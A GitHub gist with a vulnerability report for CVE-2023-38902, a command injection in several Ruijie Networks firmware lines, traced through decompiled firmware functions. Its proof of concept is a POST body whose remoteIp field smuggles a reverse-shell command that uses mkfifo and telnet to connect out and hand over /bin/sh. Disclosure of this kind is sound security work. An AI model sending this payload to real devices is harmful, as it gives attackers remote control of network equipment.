
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FZIKH26%2F18693c67ee7d2f8d2c60231b19194c37)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FZIKH26%2F18693c67ee7d2f8d2c60231b19194c37&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FZIKH26%2F18693c67ee7d2f8d2c60231b19194c37) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FZIKH26%2F18693c67ee7d2f8d2c60231b19194c37&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@ZIKH26](https://avatars.githubusercontent.com/u/93199623?s=64&v=4)](/ZIKH26)

# [ZIKH26](/ZIKH26)/**[CVE\_ruijie\_report.md](/ZIKH26/18693c67ee7d2f8d2c60231b19194c37)** Secret

Last active
November 3, 2024 00:03

Show Gist options

* [Download ZIP](/ZIKH26/18693c67ee7d2f8d2c60231b19194c37/archive/be7e71ebf7349806fb53646d32a763db56a9a4cf.zip)

* [Star
  (4)
  4](/login?return_to=https%3A%2F%2Fgist.github.com%2FZIKH26%2F18693c67ee7d2f8d2c60231b19194c37)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FZIKH26%2F18693c67ee7d2f8d2c60231b19194c37)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/ZIKH26/18693c67ee7d2f8d2c60231b19194c37.js&quot;&gt;&lt;/script&gt;
* Save ZIKH26/18693c67ee7d2f8d2c60231b19194c37 to your computer and use it in GitHub Desktop.

[Code](/ZIKH26/18693c67ee7d2f8d2c60231b19194c37)
[Revisions
9](/ZIKH26/18693c67ee7d2f8d2c60231b19194c37/revisions)
[Stars
4](/ZIKH26/18693c67ee7d2f8d2c60231b19194c37/stargazers)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/ZIKH26/18693c67ee7d2f8d2c60231b19194c37.js&quot;&gt;&lt;/script&gt;

Save ZIKH26/18693c67ee7d2f8d2c60231b19194c37 to your computer and use it in GitHub Desktop.

[Download ZIP](/ZIKH26/18693c67ee7d2f8d2c60231b19194c37/archive/be7e71ebf7349806fb53646d32a763db56a9a4cf.zip)

CVE ruijie report

 [Raw](/ZIKH26/18693c67ee7d2f8d2c60231b19194c37/raw/be7e71ebf7349806fb53646d32a763db56a9a4cf/CVE_ruijie_report.md)

[**CVE\_ruijie\_report.md**](#file-cve_ruijie_report-md)

# CVE-ID

[CVE-2023-38902](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38902)

# Information

**Vendor of the products:** Ruijie Networks

**Vendor's website:** <https://www.ruijienetworks.com/>

**Reported by:** Wang Jincheng(wjcwinmt@outlook.com) ，He Nan(2777256035@qq.com)

**Affected products:** RG-EW Series Routers and Repeaters, RG-NBS and RG-S1930 Series Switches, RG-EG Series business VPN Routers, RG-EAP and RG-RAP Series Wireless APs, RG-NBC Series Wireless Controllers

**Affected firmware version:** EW\_3.0(1)B11P219, SWITCH\_3.0(1)B11P219, EG\_3.0(1)B11P219, AP\_3.0(1)B11P219, AC\_3.0(1)B11P219

**Firmware download address:** [ReyeeOS219](https://www.ruijie.com.cn/fw/rj-first-2357/)

# Overview

A **command injection vulnerability** in `RG-EW` series routers and repeaters `v.EW_3.0(1)B11P219`, `RG-NBS` and `RG-S1930` series switches `v.SWITCH_3.0(1)B11P219`, `RG-EG` series business VPN routers `v.EG_3.0(1)B11P219`, `RG-EAP` and `RG-RAP` series wireless access points `v.AP_3.0(1)B11P219`, and `RG-NBC` series wireless controllers `v.AC_3.0(1)B11P219` allows an authorized attacker to execute arbitrary commands on remote devices by sending a POST request to `/cgi-bin/luci/api/cmd` via the `remoteIp` field.

# Vulnerability details

Analyzing the `/usr/lib/lua/luci/modules/cmd.lua` file reveals that operation types such as `devConfig` or `devSta` and operators such as `get` or `set` can be arbitrarily combined into different `method` fields. For instance, when selecting the `devConfig.get` method, it triggers the `doParams(params)` function. The `params` here is the `JSON` data sent by the POST request. Subsequently, during the invocation of the `fetch` function, it ultimately triggers the `uf_client_call` function from `/usr/lib/libunifyframe.so`. Following this, the data will be transmitted via `socket` to `/usr/sbin/unifyframe-sgi.elf`.
[![image](https://user-images.githubusercontent.com/93199623/260514239-29855404-b1c3-449e-8378-b78e48883ed3.png)](https://user-images.githubusercontent.com/93199623/260514239-29855404-b1c3-449e-8378-b78e48883ed3.png)

In the `/usr/lib/libunifyframe.so` file, it is documented that the value of `remoteIp` is parsed from `a1[5]`, where `a1` represents the base address of the `JSON` data object. Moreover, `a1` here is of type `DWORD*` (four bytes here), making `a1[5]` equivalent to `*(a1+20)`, representing the `remoteIp` field.

[![image](https://user-images.githubusercontent.com/93199623/260514351-4af55beb-8881-4a90-b6e3-b458b9a7b148.png)](https://user-images.githubusercontent.com/93199623/260514351-4af55beb-8881-4a90-b6e3-b458b9a7b148.png)

Within the `/usr/sbin/unifyframe-sgi.elf` file, there exists a **command injection vulnerability**. The first formatting character `%s` in the `snprintf` function corresponds to `*(a1+20)`, which represents the value of the `params.remoteIp` field in the POST request. This value is user-controllable, ultimately leading to the execution of arbitrary commands when the `ufm_popen` function is invoked.

[![image](https://user-images.githubusercontent.com/93199623/260514390-438ef6de-440f-4a97-81be-2f86bf0af396.png)](https://user-images.githubusercontent.com/93199623/260514390-438ef6de-440f-4a97-81be-2f86bf0af396.png)

# Poc

Send the following POST request to `/cgi-bin/luci/api/cmd`.

```
{
    "method": "devConfig.get",
    "params": {
        "module": "123",
        "remoteIp": "$(mkfifo /tmp/test;telnet 192.168.45.203 6666 0</tmp/test|/bin/sh > /tmp/test)",
        "data": {
            "kkk": "abc"
        }
    }
}
```

# Attack Demonstration

[![image](https://user-images.githubusercontent.com/93199623/260513870-98c8ab71-171d-4708-8599-2851822cce47.png)](https://user-images.githubusercontent.com/93199623/260513870-98c8ab71-171d-4708-8599-2851822cce47.png)
[![image](https://user-images.githubusercontent.com/93199623/260513905-07d1e550-ee0d-4d3d-bcf4-91a3e1c2e72c.png)](https://user-images.githubusercontent.com/93199623/260513905-07d1e550-ee0d-4d3d-bcf4-91a3e1c2e72c.png)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FZIKH26%2F18693c67ee7d2f8d2c60231b19194c37)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

